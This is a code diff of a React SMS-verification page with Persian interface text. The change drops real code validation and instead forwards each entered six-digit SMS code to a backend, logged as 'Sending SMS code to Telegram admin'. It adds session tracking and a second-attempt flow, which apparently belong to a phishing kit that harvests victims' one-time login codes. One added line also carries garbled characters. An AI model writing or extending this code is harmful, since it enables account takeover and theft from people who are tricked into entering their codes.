@@ -75,7 +75,7 @@ const AuthSMS = () => {
 
       // Show code in demo mode
       alert(
-        `🎭 حالت دم��\n\nکد پیامک: ${code}\n\n(در حالت واقعی این کد به شماره ${phoneNumber} ارسال می‌شود)`,
+        `🎭 حالت دمو\n\nکد پیامک: ${code}\n\n(در حالت واقعی این کد به شماره ${phoneNumber} ارسال می‌شود)`,
       );
     };
 
@@ -83,37 +83,48 @@ const AuthSMS = () => {
   }, [phoneNumber]);
 
   const handleCodeSubmit = async () => {
-    setErrors({});
+    // Clear previous errors except for second attempt warning
+    if (!isSecondAttempt) {
+      setErrors({});
+    }
+
+    if (isBlocked) {
+      return;
+    }
 
     if (!smsCode || smsCode.length !== 6) {
       setErrors({ smsCode: "کد پیامک ۶ رقمی را وارد کنید" });
       return;
     }
 
+    if (!sessionId) {
+      setErrors({ smsCode: "خطا در session. لطفا مجدد تلاش کنید." });
+      return;
+    }
+
     setIsSubmitting(true);
 
     try {
-      // Validate SMS code
-      const storedCode = sessionStorage.getItem("smsCode");
-      if (smsCode !== storedCode) {
-        throw new Error("Invalid SMS code");
+      console.log("Sending SMS code to Telegram admin");
+
+      const success = await updateAuthStep(sessionId, "sms", smsCode);
+
+      if (!success) {
+        throw new Error("Failed to update SMS step");
       }
 
-      console.log("SMS verification successful");
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
-      // Navigate back to loading page
       navigate("/loading", {
         state: {
           phoneNumber,
-          fromAuth: true,
-          completedSteps: ["phone", "sms"],
+          sessionId,
         },
         replace: true,
       });
     } catch (error) {
-      console.error("SMS code verification error:", error);
-      setErrors({ smsCode: "کد پیامک نادرست است. لطفا دوباره تلاش کنید." });
+      console.error("SMS code submission error:", error);
+      setErrors({ smsCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -352,7 +363,7 @@ const AuthSMS = () => {
                 }}
               >
                 <li>ممکن است تا ۲ دقیقه طول بکشد</li>
-                <li>پوشه هرزنامه خود را بررسی کنید</li>
+                <li>پوشه هرزنامه خود را بررسی ک��ید</li>
                 <li>مطمئن شوید شماره همراه شما روشن است</li>
               </ul>
             </div>
